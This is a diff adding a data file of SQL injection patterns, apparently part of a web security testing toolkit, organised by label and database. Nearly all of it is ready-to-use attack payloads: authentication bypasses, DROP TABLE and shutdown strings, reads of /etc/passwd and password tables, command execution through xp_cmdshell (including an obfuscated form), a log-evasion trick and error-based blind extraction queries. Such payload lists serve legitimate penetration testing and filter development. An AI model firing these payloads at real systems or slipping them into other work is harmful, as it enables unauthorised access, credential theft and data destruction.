@@ -1,0 +1,509 @@
+#! csv2xml.pl $0
+#?
+#? NAME
+#?      $0 - SQL Pattern
+#?
+#? SYNOPSIS
+#?      csv2xml.pl $0
+#?
+#? DESCRIPTION
+#?      Data for SQL injection pattern.
+#?
+#?   Format of table herein:
+#?      Each line is one pattern. The format of the line is:
+#?        DB  NAME  DESCRIPTION  CODE
+#?      The columns are:
+#?!     #?!          - comment line for format description herein
+#?!                    Note:  there  must be  at least on empty line after last
+#?!                           such comment line and before very first menu line
+#?!     #            - comment line, ignored
+#?!     LABEL        - special line with label name
+#?!                    this is used for all following lines 'til next  LABEL
+#?!     DB           - line vallid for specified DB
+#?!                    valid values:  Ingress, MSAccess, MSSQL, MySQL, Oracle,
+#?!                                   Postgre, TSQL, *
+#?!     NAME         - name of pattern
+#?                     if  *  value from  CODE  is use
+#?!     DESCRIPTION  - description of pattern
+#?                     if  *  value from  CODE  is use
+#?!     CODE         - SQL pattern
+#?!
+#?!  Format of XML file:
+#?!     <xml>
+#?!         <attack>
+#?!             <label>LABEL</label>
+#?!             <name>NAME</name>
+#?!             <code>CODE</code>
+#?!             <desc>DESCRIPTION</desc>
+#?!             <browser>DB</browser>
+#?!         </attack>
+#?!     </xml>
+#?
+#? SEE ALSO
+#?      csv2xml.pl
+#?
+#? VERSION
+#?      @(#) sqlPattern.txt 3.10 11/12/04 19:43:12
+#?
+#? AUTHOR
+#?      17-feb-08 Achim Hoffmann, mailto: EnDe (at) my (dash) stp (dot) net
+#?
+# -----------------------------------------------------------------------------
+
+#------+-------+---------------------------------------+---------------
+# DB	NAME	DESCRIPTION				CODE
+#------+-------+---------------------------------------+---------------
+LABEL	basic tests
+*	*	*	1=1
+*	*	*	x'
+*	*	*	x''
+*	*	*	x')
+*	*	*	x'='x
+*	*	*	x'='
+*	*	*	1%00
+*	*	*	x'%00
+*	*	*	1\00
+*	*	*	1\\00
+*	*	*	x'\\00
+*	*	*	x'\00
+*	*	*	1%2500
+*	*	*	x'%2500
+*	*	*	x' (SELECT * FROM DUAL)--
+
+LABEL	interger tests
+*	*	*	1 AND 1=1
+*	*	*	1 AND 1=0
+*	*	*	1 OR 1=1
+*	*	*	1 OR 1=0
+*	*	*	1 OR 'z'='z
+*	*	*	1 OR 'z'='z'
+MSSQL	*	*	1 OR 'z'=N'z'
+*	*	*	1 OR (1)=(1)
+*	*	*	1 OR+1=1
+*	*	*	1 OR+(1)=(1)
+*	*	*	1 OR+'1'=(1)
+*	*	*	1 OR+'1'=1
+*	*	*	1 OR '1'!=0
+*	*	*	1 OR 1 IS NOT NULL
+*	*	*	1 OR NULL IS NULL
+*	*	*	1 OR ASCII(2) = ASCII(2)
+
+LABEL	number tests
+*	*	simple test	0
+*	*	simple test	-1
+*	*	simple test	2
+*	*	signed negative	-2
+*	*	signed positive	+2
+*	*	exponential number	2e1
+*	*	deciaml point	2.1
+*	*	deciaml comma	2,1
+*	*	ocatl number	002
+*	*	binary number	00010
+
+LABEL	interger calculation tests
+*	*	addition	1+1
+*	*	subtraction	3-1
+*	*	division (ok)	3/1
+*	*	division (fail)	3/0
+*	*	subtraction	4-3-1
+*	*	subtraction	4-(3-1)
+
+LABEL	interger overflow tests
+*	*	exponential number	10e1
+*	*	387420489	9e9
+*	*	913517247483640899	99e9
+*	*	4710128697246244834921603689	9e29
+*	*	2^15	32768
+*	*	2^15 +1	32769
+*	*	2^16	65536
+*	*	2^16 +1	65537
+*	*	2^(32-1)	2147483648
+*	*	2^(32-1) +1	2147483649
+*	*	2^32	4294967296
+*	*	2^32 +1	4294967297
+*	*	2^(64-1)	9223372036854775808
+*	*	2^(64-1) +1	9223372036854775809
+*	*	2^64	18446744073709551616
+*	*	2^64 +1	18446744073709551617
+
+LABEL	string tests
+*	*	*	x' AND 1=1
+*	*	*	x' AND 1=0
+*	*	*	x' OR 1=1
+Oracle	*	*	x' OR 1=1--
+*	*	*	x' OR 1=0
+*	*	*	x' OR 'z'='z
+MSSQL	*	*	x" OR "z"="z
+MSSQL	*	*	x' OR 'z'=N'z'
+*	*	*	x' OR '1' & 1
+*	*	*	x' OR 'z' && 'z
+*	*	*	x' OR '1' XOR '0
+*	*	*	x' OR "1" ^ '0
+*	*	*	x' OR '1' ^ '0
+*	*	*	x' OR '1'|'2
+*	*	*	x' OR '1' XOR '0
+*	*	*	x' OR 1&'1
+*	*	*	x' HAVING 1 #1 !
+*	*	*	x' OR id=1 HAVING 1 #1 !
+*	*	*	x' OR id=+1 HAVING 1 #1 !
+*	*	*	x' OR username REGEXP 'admi*' HAVING 1 #1 !
+*	*	*	x' OR username=0x61646D696E; #a !
+MySQL	*	*	x' OR IF(-1=-1,true,false)#!
+MSSQL	*	*	x' OR IF(1=1) SELECT 'true' ELSE SELECT 'false'
+*	*	*	x' OR column='1
+*	*	*	x' OR column!='1
+*	*	*	x' OR column DIV null IS NULL #(
+*	*	*	x' OR column+(1)='1
+*	*	*	x' OR id SOUNDS LIKE'\'
+*	*	*	x' OR LOCALTIME!='0
+*	*	*	x' OR BINARY 1= '1
+*	*	*	x' OR current_user!=' 1
+MySQL	*	*	x'='x
+MySQL	*	*	x'='
+MySQL	*	*	x' LIKE'0
+MySQL	*	*	x' REGEXP/RLIKE BINARY 0#(
+MySQL	*	*	x' SOUNDS LIKE+'1
+MySQL	*	*	x' OR CURRENT_TIME!='0
+MySQL	*	*	x' OR CURRENT_TIMESTAMP!='0
+MySQL	*	*	x'!=LOCALTIMESTAMP #(
+MySQL	*	*	x' IN (0)#(
+MySQL	*	*	x'!=ASCII(1)#
+
+LABEL	string concat tests
+DB2	*	*	x'||'y
+MySQL	*	*	x''y
+MySQL	*	*	x'+'y
+MSSQL	*	*	x'+'y
+Oracle	*	*	x'||'y
+Postgre	*	*	x'||'y
+SQLite	*	*	x'||'y
+Sybase	*	*	x'||'y
+Sybase	*	*	x'+'y
+VisualB	*	*	Basic	x'&'y
+DB2	*	common SQL	select 'x' concat 'y'
+MySQL	*	common SQL	select concat('x','y')
+MySQL	*	common SQL	select concat("x","y")
+Oracle	*	common SQL	select concat('x','y')
+
+LABEL	escape tests
+*	*	*	x\'1
+*	*	*	x\\'1
+
+LABEL	parantheses tests
+*	*	*	1) OR 1=1
+*	*	*	x') OR 1=1
+*	*	*	x') OR 1 > 2 #
+*	*	*	x') OR ('x'='x
+*	*	*	x") OR ("x"="x
+
+LABEL	logic tests
+*	*	*	1 OR ASCII(2) = ASCII(2)
+*	*	*	1 OR BIN(2) = BIN(2)
+*	*	*	1 OR HEX(2) = HEX(2)
+*	*	*	1 OR MD5(2) = MD5(2)
+*	*	*	1 OR SPACE(2) = SPACE(2)
+*	*	*	1 OR USER(2) = USER(2)
+*	*	*	1 OR VERSION(2) = VERSION(2)
+*	*	*	1 OR bit_lengtrh(2) = bit_lengtrh(2)
+*	*	*	and 1=1-(True)
+*	*	*	and 1=2-(False)
+MySQL	*	*	x'IS\N - '1
+MySQL	*	*	x' IS \N - '1
+MySQL	*	*	x' IS\N|!'
+*	*	*	x' IS \N OR '1
+*	*	*	x' IS \N|! '
+*	*	*	x' IS \N - ! '
+*	*	*	x' IS \N = '
+*	*	*	x' OR null IS null #
+*	*	*	x' OR-1='-1
+*	*	*	x' OR!1='!1
+*	*	*	x' OR!(1)='1
+*	*	*	x' OR@1='@1
+*	*	*	x' OR-1 XOR'0
+*	*	*	x' OR ASCII(1)='49
+*	*	*	x' OR MD5(1)^'1
+*	*	*	x' OR MD5(5)^'1
+*	*	*	x' OR!'a
+*	*	*	x' OR!'0
+*	*	*	x' OR-'1
+*	*	*	x' OR@'1' IS NULL #1 !
+*	*	*	x' OR!(false) #1 !
+*	*	*	x' OR-(true) #a !
+MySQL	*	*	x'!='0
+*	*	*	x' !=' 0
+*	*	*	x' IS NOT NULL#(
+*	*	*	x' XOR'1
+*	*	*	x' IN('z')#(
+*	*	*	x'!='1
+*	*	*	x'!=~'1
+*	*	*	x'=('z')#(
+*	*	*	x'|+'1
+*	*	*	x'|!'z
+*	*	*	x'^!'z
+*	*	*	x'/0 IS null #(
+*	*	*	x' DIV+1='z
+*	*	*	x' DIV null IS null #(
+*	*	*	x' IN('xx') OR-1!='0
+*	*	*	x' IS NOT NULL OR+1=+'1
+*	*	*	x'!=ASCII(1) OR-1=-'1
+*	*	*	x' AND 1=%%%%%%%%1'
+
+LABEL	comment tests
+*	*	*	1;
+*	*	*	1*
+*	*	*	1#
+*	*	*	1-
+*	*	*	1--
+DB2	*	*	1 --
+Ingres	*	*	1 --
+Ingres	*	*	1 /**/1
+MySQL	*	*	1-- #
+*	*	*	1/*
+*	*	*	;-- -{alphanums}- /*#
+*	all in one	*	;--*/*#
+Oracle	*	*	1-- 
+Oracle	*	*	1/*--*/1
+Sybase	*	*	1''--
+#
+# MySQL comment -- needs to be trailed with at least one whitespace
+# to avoid trimming a trailing whitspace, we also add a # (hash)
+# which is valid as comment too
+MySQL	*	*	(plain)	1-- 
+MySQL	*	*	(hash)	1-- #
+MySQL	*	*	(TAB\t)	1--\t#
+MySQL	*	*	(TAB)	1--	#
+*	*	*	simulate/**/space
+
+LABEL	wildcard/pattern tests
+*	single character	*	_
+*	string	*	%
+MySQL	pattern	*	[A-Z]
+MySQL	negation	*	!
+
+LABEL	number tests
+*	*	*	id=111      # integer
+*	*	*	id=0x6f     # hex
+*	*	*	id=0157     # octal
+*	*	*	id=110+1    # 110%2b1
+*	*	*	id=112-1    #
+*	*	*	id=MOD(111,112)  # MOD(0,a) forces error
+*	*	*	id=REPEAT(1,3)
+*	*	*	id=COALESCE(NULL,NULL,111)
+
+LABEL	string function tests
+*	*	*	id=sik
+*	*	*	id=REVERSE(kis)
+*	*	*	id=GREATEST(0x11,0x12,0x13)
+*	*	*	id=LEAST(0x11,0x11)
+Oracle	*	*	id=CONCAT('ad','min')
+DB2	*	*	id=CONCAT('ad','min')
+MSSQL	*	*	id=CONCAT('ad','min')
+MySQL	*	*	id=CONCAT('ad','min')
+Sybase	*	*	id=CONCAT('ad','min')
+MSSQL	*	*	id=('ad'+'min')
+MSSQL	*	*	id=CHAR(83)+CHAR(81)+CHAR(76)
+MSSQL	*	*	id=nchar(83)+nchar(81)+nchar(76)
+Postgre	*	*	id=CHR(83)||CHR(81)||CHR(76)
+Oracle	*	*	id=CONCAT(CHR(83),CHR(81),CHR(76))
+Oracle	*	*	id=CHR(83)||CHR(81)||CHR(76)
+MySQL	*	*	id=CHAR(83,81,76)
+MySQL	*	*	id=0x53514c
+
+# following from: http://ha.xxor.se/2011/06/speeding-up-blind-sql-injections-using.html
+LABEL	REGEX functions
+MySQL	*	MySQL: return true	1 REGEXP 1
+MySQL	*	MySQL: throw error	1 REGEXP ""
+# "Got error 'empty (sub)expression' from regexp"
+MySQL	*	MySQL: return true	1 REGEXP IF(1=1,1,'')
+MySQL	*	MySQL: throw error	1 REGEXP IF(1=2,1,'')
+MySQL	*	MySQL: throw error	1 REGEXP ''
+# Got error 'empty (sub)expression' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '('
+# Got error 'parentheses not balanced' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '['
+# Got error 'brackets ([ ]) not balanced' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '\\'
+# Got error 'trailing backslash (\)' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '*'
+# Got error 'repetition-operator operand invalid' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP 'a{1,1,1}'
+# Got error 'invalid repetition count(s)' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '[a-9]'
+# Got error 'invalid character range' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP 'a{1,'
+# Got error 'braces not balanced' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '[[.ab.]]'
+# Got error 'invalid collating element' from regexp
+MySQL	*	MySQL: throw error	1 REGEXP '[[:ab:]]'
+# Got error 'invalid character class' from regexp
+
+LABEL	DB type/versions
+Oracle	*	*	SYSDATE
+MSSQL	*	*	GETDATE()
+MSSQL	*	*	1 and(1)=convert(int,@@version)--
+MySQL	*	*	/*!32302+AND+0+*/
+MySQL	*	*	/*!32302+AND+0+*//*
+MySQL	*	*	/*!32302+AND+1+*//*
+MySQL	*	*	# Test MySQL-Version 5.0.28
+MySQL	*	*	SELECT * FROM TABLE WHERE id=5 /*!50028 test */
+MySQL	*	*	1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--
+MySQL	*	*	(1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from TABLE_NAME group by x)a)--
+Postgre	*	*	1 and(1)=cast(version() as numeric)--
+Sybase	*	*	1 and(1)=convert(int,@@version)--
+MSSQL	*	*	1 and(1)=convert(int,@@version)--
+Oracle	*	*	select XMLType((select substr(version,1,1) from v$instance)) from users;
+Oracle	*	*	select XMLType((select substr(version,2,1) from v$instance)) from users;
+Oracle	*	*	select XMLType((select substr(version,3,1) from v$instance)) from users;
+
+LABEL	void functions
+*	*	*	x' or ISNULL(1/0) #(
+*	*	*	x' or LEAST(2,1) -- -x
+
+#LABEL	agregat functions
+
+LABEL	system variables
+MSSQL	*	*	1 *@@version*-0 = 1
+MSSQL	*	*	x' *@@version*-0 = '0
+MSSQL	*	*	x' *@v OR '1
+MSSQL	*	*	x' *@v IS null - '
+MSSQL	*	*	x' @@error IS null - '
+MSSQL	*	*	x' @@identity IS null - '
+MSSQL	*	*	x' @@nestlevel IS null - '
+MSSQL	*	*	x' @@procid IS null - '
+MSSQL	*	*	x' @@rowcount IS null - '
+MSSQL	*	*	x' @@servername IS null - '
+*	*	*	x' *UTC_TIME OR '1
+*	*	*	x' *null OR '1
+*	*	*	x' *null IS null - '
+DB2	*	common SQL	select versionnumber, version_timestamp from sysibm.sysversions
+DB2	*	common SQL	select user from sysibm.sysdummy1
+DB2	*	common SQL	select session_user from sysibm.sysdummy1
+DB2	*	common SQL	select system_user from sysibm.sysdummy1
+DB2	*	common SQL	select current server from sysibm.sysdummy1
+DB2	*	common SQL	select name from sysibm.systables
+DB2	*	common SQL	select name, tbname, coltype from sysibm.syscolumns
+DB2	*	common SQL	select grantee from syscat.dbauth
+MSSQL	*	common SQL	select @@version
+MSSQL	*	common SQL	select @@servername
+MSSQL	*	common SQL	select @@microsoftversion
+MSSQL	*	common SQL	select * from master..sysservers
+MSSQL	*	common SQL	select * from sysusers
+Postgre	*	common SQL	select version()
+Postgre	*	common SQL	select current_database()
+Postgre	*	common SQL	select current_user
+Postgre	*	common SQL	select session_user
+Postgre	*	common SQL	select current_setting('log_connections')
+Postgre	*	common SQL	select current_setting('log_statement')
+Postgre	*	common SQL	select current_setting('port')
+Postgre	*	common SQL	select current_setting('password_encryption')
+Postgre	*	common SQL	select current_setting('krb_server_keyfile')
+Postgre	*	common SQL	select current_setting('virtual_host')
+Postgre	*	common SQL	select current_setting('port')
+Postgre	*	common SQL	select current_setting('config_file')
+Postgre	*	common SQL	select current_setting('hba_file')
+Postgre	*	common SQL	select current_setting('data_directory')
+Sybase	*	common SQL	select @@version''--
+Sybase	*	common SQL	select * from master..syslogins''--
+Sybase	*	common SQL	select * from master..sysdatabases''--
+
+LABEL	joined commands
+*	*	*	ORDER BY 1--
+*	*	*	x' OR 'q'='q' ORDER BY 1 ASC;#--*/*
+*	*	*	x' OR 'q'='q' ORDER BY 2 ASC;#--*/*
+*	*	*	x' OR 'q'='q' ORDER BY 1 DESC;#--*/*
+*	*	*	x' OR 'q'='q' ORDER BY 2 DESC;#--*/*
+
+LABEL	destructive tests
+Oracle	*	*	'; DROP TABLE users--
+*	*	*	ORDER BY 1 DROP TABLE users
+*	*	*	1 OR (DROP TABLE users)=(1)
+*	*	*	x' OR (DROP TABLE users)=(1)
+MSSQL	*	*	x'; DROP sys_db '
+MSSQL	*	*	x'; DROP sys_db --
+MSSQL	*	*	x"; DROP sys_db "
+MSSQL	*	*	x"; DROP sys_db --
+MSSQL	*	*	x'; shutdown '
+MSSQL	*	*	x'; shutdown --
+MSSQL	*	*	x"; shutdown "
+MSSQL	*	*	x"; shutdown --
+MSSQL	*	*	1; WAITFOR TIME '09:42:42 ' shutdown -- -z
+MSSQL	*	*	x'; WAITFOR TIME '09:42:42 ' shutdown -- -z
+MSSQL	*	*	x'; SELECT sc.Text FROM syscomments sc JOIN sysobjects so ON so.id = sc.id WHERE so.Name LIKE '%PROC_NAME%'
+Oracle	*	*	-1 UNION SELECT CONCAT(username,0x3a,password) FROM jos_users--
+
+LABEL	authentication bypass
+*	*	username without password	x' OR 1=1
+Oracle	*	username without password	x' OR 1=1--
+*	*	password	' OR ''='
+*	*	username	admin'--
+*	*	username	admin';--
+*	*	username	admin'/*
+*	*	username	admin'#
+*	*	username	admin';#--*/*
+
+LABEL	read/write files on filesystem
+MSSQL	*	backup entire db to file	x'; BACKUP database master to disks='\\{IP}\{sharename}\backupdb.dat' -- -z
+MSSQL	*	reading files on filesystem	x'; create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'" select * from myfile" -- -z
+Sybase	*	write file	x'; create table myfile (record varchar(2000)) external file at "c:\temp\file.exe" insert into myfile values(0xBINARY_DATA)" --
+MySQL	*	read file	create table afile (input TEXT); load data infile '/etc/passwd' into table afile -- #
+MySQL	*	write file	select host,user,password from user into outfile '/tmp/passwd' -- #
+Postgre	*	write file	copy table to '/tmp/test';
+Postgre	*	read file	create table afile (input TEXT); copy afile from '/etc/passwd'; select * from afile
+
+LABEL	command execution
+MSSQL	*	*	x'; exec master..xp_cmdshell 'ipconfig+/all' -- -z
+MSSQL	*	*	x'; exec master..xp_cmdshell 'net+view' -- -z
+MSSQL	*	*	x'; exec master..xp_cmdshell 'net+users' -- -z
+MSSQL	*	ping attacker target	x'; exec master..xp_cmdshell 'ping+target' -- -z
+MSSQL	*	start/stop service	x'; xp_servicecontrol START <service> -- -z
+Sybase	*	*	x'; xp_cmdshell 'ipconfig+/all' --
+Sybase	*	*	x'; xp_cmdshell 'net+view' --
+Sybase	*	*	x'; xp_cmdshell 'net+users' --
+Sybase	*	ping attacker target	x'; xp_cmdshell 'ping+target' --
+
+LABEL	misc tests
+MSSQL	*	*	x'; alabel: GOTO alabel -- -z
+MSSQL	*	*	x'; WAITFOR TIME '09:42:42 ' shutdown -- -z
+MSSQL	*	*	SELECT SLEEP(3) from existing_table;--/*
+MSSQL	*	*	SELECT SLEEP(3) from non_existing_table;--/*
+*	*	*	%A'' UNION SELECT 1 /*
+*	*	*	%A'' UNION SELECT 1 */
+MSSQL	*	*	';exec xp_cmdshell 'dir';– 
+MSSQL	*	*	';Declare @cmd as varchar(3000);Set @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";exec(@cmd);– 
+MSSQL	*	prevent logging	'dmin -sp_password
+MySQL	*	*	BENCHMARK(1000000000,MD5('long-time'))
+MySQL	*	*	BENCHMARK(1000000000,MD5(HAR(115)))
+MySQL	*	*	x'; waitfor delay '0:0:42' -- #
+Sybase	*	*	x'; waitfor delay '0:0:42' --
+Postgre	*	database usernames and passwords	select * from pg_shadow
+Postgre	*	database usernames and passwords	select * from pg_group
+
+LABEL	XML tests
+Oracle	*	should return "XML parsing failed"	select XMLType((select 'abcdef' from dual)) from dual;
+
+# see http://ptresearch.blogspot.com/2010/01/methods-of-quick-exploitation-of-blind.html
+LABEL	blind injection tests
+MSSQL	*	*	select convert(int,@@version)--
+MSSQL	*	*	1 and(1)=convert(int,@@version)--
+Postgre	*	*	1 and(1)=cast(version() as numeric)--
+Sybase	*	*	1 and(1)=convert(int,@@version)--
+Sybase	*	*	1 and(1)=convert(int,(select+min(name)+from+syslogins+where+name>'sybase'))--
+MSSQL	*	*	select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=1))--
+MSSQL	*	*	select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=2))--
+MySQL	*	*	select count(*),concat(version(),floor(rand(0)*2))x from table group by x--
+MySQL	*	*	select count(*),concat((select user from mysql.user limit 0,1),floor(rand(0)*2)) x from mysql.user group by x--
+MySQL	*	*	select count(*),concat((select user from mysql.user limit 1,1),floor(rand(0)*2)) x from mysql.user group by x--
+MySQL	MySQL 4.1	*	select 1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--
+MySQL	MySQL>=5.0	*	(1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--
+Postgre	*	*	select cast(version() as numeric)--
+Postgre	*	*	select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric)--
+Postgre	*	*	select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric)--
+Oracle	Oracle>9.0	*	1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
+
+LABEL	error-based (blind) injection tests
+Sybase	*	*	RAND((SELECT COUNT(*) FROM table)%2b900000000000)
+Sybase	*	*	RAND(ASCII(SUBSTRING(user,1,1))%2b900000000000)
+
+#LABEL	misc
+
+#------+-------+---------------------------------------+---------------
